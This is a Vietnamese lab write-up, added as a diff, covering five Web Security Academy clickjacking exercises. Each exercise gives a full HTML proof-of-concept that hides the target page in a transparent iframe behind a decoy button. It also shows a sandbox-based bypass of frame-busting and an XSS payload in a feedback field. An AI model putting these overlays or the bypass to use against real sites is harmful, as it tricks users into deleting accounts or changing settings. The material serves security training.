@@ -1,0 +1,181 @@
+1 : Basic clickjacking with CSRF token protection
+
+Khi đăng nhập vào tài khoản, ở trang cá nhân sẽ có một nút xóa tài khoản. Ta sẽ tạo 2 frame với frame là target, rất mờ để user khong thể nhìn thấy, một frame còn lại để dụ user bấm vào một nút có vị trí trùng với nút xóa tài khoản. Đưa vào exploit server html sau:
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1000px;
+			height:1000px;
+			opacity:0.3;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1000px;
+			height:1000px;
+			z-index:1;
+			}
+                #butt {
+			position:absolute;
+                        margin: 567px 100px
+                 }
+                        
+	</style>
+</head>
+<body>
+	<div id="decoy_website">
+	      <button id="butt">click</button>
+	</div>
+	<iframe id="target_website" src="https://0a59008c03f33738c1d849d8000200fe.web-security-academy.net/my-account">
+	</iframe>
+</body>
+
+2: Clickjacking with form input data prefilled from a URL parameter
+
+Khi đăng nhập, ta thấy có phần input để đổi email và nếu thêm param email ở trên URL như:
+
+https://0ad400ca032b6aafc074457a00450038.web-security-academy.net/my-account?email=a@a
+
+thì email trong input cũng sẽ được thay đổi giá trị, ta đưa link này vào frame và làm như lần trước, chỉnh InnerHTML của button thành "Click Me"
+
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1000px;
+			height:1000px;
+			opacity:0.3;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1000px;
+			height:1000px;
+			z-index:1;
+			}
+                #butt {
+			position:absolute;
+                        margin: 450px 90px
+                 }
+                        
+	</style>
+</head>
+<body>
+	<div id="decoy_website">
+	      <button id="butt">Click Me</button>
+	</div>
+	<iframe id="target_website" src="https://0ad400ca032b6aafc074457a00450038.web-security-academy.net/my-account?email=a@a">
+	</iframe>
+</body>
+
+3: Khi cho target web vào frame ta thấy hệ thống đã ngăn cho nó bị framed, bypass việc này bằng cách thêm giá trị "allow-forms" cho attribute sandbox của iframe:
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1000px;
+			height:1000px;
+			opacity:0.3;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1000px;
+			height:1000px;
+			z-index:1;
+			}
+                #butt {
+			position:absolute;
+                        margin: 452px 90px
+                 }
+                        
+	</style>
+</head>
+<body>
+	<div id="decoy_website">
+	      <button id="butt">Click Me</button>
+	</div>
+	<iframe id="target_website" src="https://0af7006703860f43c0c4e5d800bf00f7.web-security-academy.net/my-account?email=a@a" sandbox="allow-forms">
+	</iframe>
+</body>
+
+4: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+Vào phần feedback, ta thấy có thể XSS phần name bằng cách để tên là:
+
+<img onerror="javascript:print()" src="">
+
+Ta thiết lập submit feedback và dụ người dùng bấm vào nút submit, sau khi bấm nút, tên nội dung trong name sẽ được gửi ra và chạy câu lệnh print()
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1000px;
+			height:1000px;
+			opacity:0.3;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1000px;
+			height:1000px;
+			z-index:1;
+			}
+                #butt {
+			position:absolute;
+                        margin: 800px 90px
+                 }
+                        
+	</style>
+</head>
+<body>
+	<div id="decoy_website">
+	      <button id="butt">Click Me</button>
+	</div>
+	<iframe id="target_website" src="https://0a89004a04173abec1b73ac800a90041.web-security-academy.net/feedback?name=<img+onerror=%22javascript:print()%22+src=%22%22>&email=a@a&subject=b&message=c">
+	</iframe>
+</body>
+
+5: Multistep clickjacking
+
+Giống ở bài 1, ta làm một nút bấm để xóa tài khoản, nhưng tiếp theo trang sẽ chuyển sang một trang confirm và cần bấm vào nút "YES" một lần nữa, như vậy chỉ cần tạo thêm button số 2 ở vị trí của button "YES" để xóa TK.
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1000px;
+			height:1000px;
+			opacity:0.3;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1000px;
+			height:1000px;
+			z-index:1;
+			}
+                #butt {
+			position:absolute;
+                        margin: 500px 100px
+                 }
+                #butt2 {
+			position:absolute;
+                        margin: 300px 200px
+                 }
+                        
+	</style>
+</head>
+<body>
+	<div id="decoy_website">
+	      <button id="butt">click</button>
+	      <button id="butt2">click</button>
+	</div>
+	<iframe id="target_website" src="https://0a9000ca034ae8f2c3b707a9000b0002.web-security-academy.net/my-account">
+	</iframe>
+</body>
